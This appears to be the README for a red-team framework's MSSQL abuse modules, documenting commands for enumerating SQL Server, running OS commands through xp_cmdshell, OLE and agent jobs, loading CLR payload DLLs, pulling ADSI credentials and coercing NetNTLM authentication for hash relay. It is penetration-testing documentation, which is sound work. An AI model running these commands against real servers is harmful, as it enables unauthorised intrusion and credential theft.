# MSSQL Abuse Modules <!-- omit from toc -->

## Contents <!-- omit from toc -->

- [Overview](#overview)
  - [sql-1434udp](#sql-1434udp)
  - [sql-adsi](#sql-adsi)
  - [sql-agentcmd](#sql-agentcmd)
  - [sql-agentstatus](#sql-agentstatus)
  - [sql-checkrpc](#sql-checkrpc)
  - [sql-clr](#sql-clr)
  - [sql-columns](#sql-columns)
  - [sql-databases](#sql-databases)
  - [sql-enable / sql-disable](#sql-enable--sql-disable)
  - [sql-impersonate](#sql-impersonate)
  - [sql-info](#sql-info)
  - [sql-links](#sql-links)
  - [sql-olecmd](#sql-olecmd)
  - [sql-query](#sql-query)
  - [sql-rows](#sql-rows)
  - [sql-search](#sql-search)
  - [sql-smb](#sql-smb)
  - [sql-tables](#sql-tables)
  - [sql-users](#sql-users)
  - [sql-whoami](#sql-whoami)
  - [sql-xpcmd](#sql-xpcmd)

## Overview

The MSSQL abuse modules provide commands for enumerating and attacking Microsoft SQL Server instances. All commands are implemented as BOF wrappers for [SQL-BOF](https://github.com/Tw1sm/SQL-BOF). The module contains the following commands:

```
 * sql-1434udp                 Enumerate SQL Server connection information.
 * sql-adsi                    Obtain ADSI credentials from a linked server.
 * sql-agentcmd                Execute a system command using agent jobs.
 * sql-agentstatus             Enumerate SQL Agent status and jobs.
 * sql-checkrpc                Enumerate RPC status of linked servers.
 * sql-clr                     Load and execute .NET assembly in a stored procedure.
 * sql-columns                 Enumerate columns within a table.
 * sql-databases               Enumerate SQL databases.
 * sql-enable                  Enable a SQL server module.
 * sql-disable                 Disable a SQL server module.
 * sql-impersonate             Enumerate users that can be impersonated.
 * sql-info                    Gather information about the SQL server.
 * sql-links                   Enumerate linked servers.
 * sql-olecmd                  Execute a system command using OLE Automation Procedures.
 * sql-query                   Execute a custom SQL query.
 * sql-rows                    Get the count of rows in a table.
 * sql-search                  Search a table for a column name.
 * sql-smb                     Coerce NetNTLM auth via xp_dirtree.
 * sql-tables                  Enumerate tables within a database.
 * sql-users                   Enumerate users with database access.
 * sql-whoami                  Gather logged in user, mapped user and roles.
 * sql-xpcmd                   Execute a system command via xp_cmdshell.
```

Most commands support the following common flags:

| Flag | Description |
| --- | --- |
| `--server` | IP address of the SQL server instance (default: `localhost`). |
| `--db` | Database to use (default: `master`). |
| `--linked-server` | Execute command through a linked server. |
| `--impersonate` | User to impersonate during execution. |

### sql-1434udp
Enumerate SQL Server connection information by sending a UDP probe to port 1434.

```
Usage  : sql-1434udp <server>
Example: sql-1434udp sql01.conquest.local

Required arguments:
  server                    STRING     IP address of the SQL server instance.
```

### sql-adsi
Obtain ADSI credentials from a linked server.

```
Usage  : sql-adsi <adsi-server> [--server <server>] [--port <port>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-adsi ADSI-server --server sql01.conquest.local --impersonate sa

Required arguments:
  adsi-server               STRING     IP address of the ADSI linked server.

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --port port               INT        ADSI port (default: 4444).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-agentcmd
Execute a system command using SQL Agent jobs. The command is run as a CmdExec job step.

```
Usage  : sql-agentcmd <command> [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-agentcmd whoami /all --server sql01.conquest.local

Required arguments:
  command                   STRING     Command to execute.

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-agentstatus
Enumerate SQL Agent status and jobs.

```
Usage  : sql-agentstatus [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-agentstatus --server sql01.conquest.local

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-checkrpc
Enumerate RPC status of linked servers.

```
Usage  : sql-checkrpc [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-checkrpc --server sql01.conquest.local

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-clr
Load and execute a .NET assembly in a stored procedure. The DLL is read from disk and sent to the SQL server as binary data.

```
Usage  : sql-clr <dll> <function> [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-clr payload.dll MyFunction --server sql01.conquest.local

Required arguments:
  dll                       FILE       Path to the .NET assembly DLL.
  function                  STRING     Name of the DLL entry point function.

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

> [!TIP]
> Enable CLR on the target server first using `sql-enable clr`.

### sql-columns
Enumerate columns within a table.

```
Usage  : sql-columns <table> [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-columns users --server sql01.conquest.local

Required arguments:
  table                     STRING     Table to enumerate columns from.

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-databases
Enumerate SQL databases.

```
Usage  : sql-databases [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-databases --server sql01.conquest.local

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-enable / sql-disable
Enable or disable a SQL server module.

```
Usage  : sql-enable <module> [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
         sql-disable <module> [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-enable clr --server sql01.conquest.local
         sql-disable xp_cmdshell --server sql01.conquest.local

Required arguments:
  module                    STRING     Module to enable/disable.

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

The following modules are available:

| Module | Description |
| --- | --- |
| `clr` | CLR integration for executing .NET assemblies. |
| `ole` | OLE Automation Procedures for system command execution. |
| `xp_cmdshell` | Extended stored procedure for OS command execution. |
| `rpc` | Remote Procedure Call on a linked server (requires `--linked-server`). |

### sql-impersonate
Enumerate users that can be impersonated.

```
Usage  : sql-impersonate [--server <server>] [--db <database>]
Example: sql-impersonate --server sql01.conquest.local

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
```

### sql-info
Gather information about the SQL server.

```
Usage  : sql-info [--server <server>] [--db <database>]
Example: sql-info --server sql01.conquest.local

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
```

### sql-links
Enumerate linked servers.

```
Usage  : sql-links [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-links --server sql01.conquest.local

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-olecmd
Execute a system command using OLE Automation Procedures.

```
Usage  : sql-olecmd <command> [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-olecmd whoami --server sql01.conquest.local

Required arguments:
  command                   STRING     Command to execute.

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

> [!TIP]
> Enable OLE Automation Procedures on the target server first using `sql-enable ole`.

### sql-query
Execute a custom SQL query.

```
Usage  : sql-query <query> [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-query "SELECT name FROM master.dbo.sysdatabases" --server sql01.conquest.local

Required arguments:
  query                     STRING     SQL query to execute.

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-rows
Get the count of rows in a table.

```
Usage  : sql-rows <table> [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-rows users --server sql01.conquest.local

Required arguments:
  table                     STRING     Table to count rows from.

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-search
Search a table for a column name.

```
Usage  : sql-search <keyword> [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-search password --server sql01.conquest.local

Required arguments:
  keyword                   STRING     Column name keyword to search for.

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-smb
Coerce NetNTLM authentication via `xp_dirtree`. Useful for capturing hashes with a tool like Responder or ntlmrelayx.

```
Usage  : sql-smb <listener> [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-smb \\\\10.10.10.1\\share --server sql01.conquest.local

Required arguments:
  listener                  STRING     UNC path to the listener (e.g. \\\\host\\share).

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-tables
Enumerate tables within a database.

```
Usage  : sql-tables [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-tables --server sql01.conquest.local

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-users
Enumerate users with database access.

```
Usage  : sql-users [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-users --server sql01.conquest.local

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-whoami
Gather logged in user, mapped user and roles.

```
Usage  : sql-whoami [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-whoami --server sql01.conquest.local

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

### sql-xpcmd
Execute a system command via `xp_cmdshell`.

```
Usage  : sql-xpcmd <command> [--server <server>] [--db <database>] [--linked-server <server>] [--impersonate <user>]
Example: sql-xpcmd whoami --server sql01.conquest.local

Required arguments:
  command                   STRING     Command to execute.

Optional arguments:
  --server server           STRING     IP address of the SQL server instance (default: localhost).
  --db database             STRING     Database to use (default: master).
  --linked-server server    STRING     Execute command through linked server.
  --impersonate user        STRING     User to impersonate during execution.
```

> [!TIP]
> Enable xp_cmdshell on the target server first using `sql-enable xp_cmdshell`.
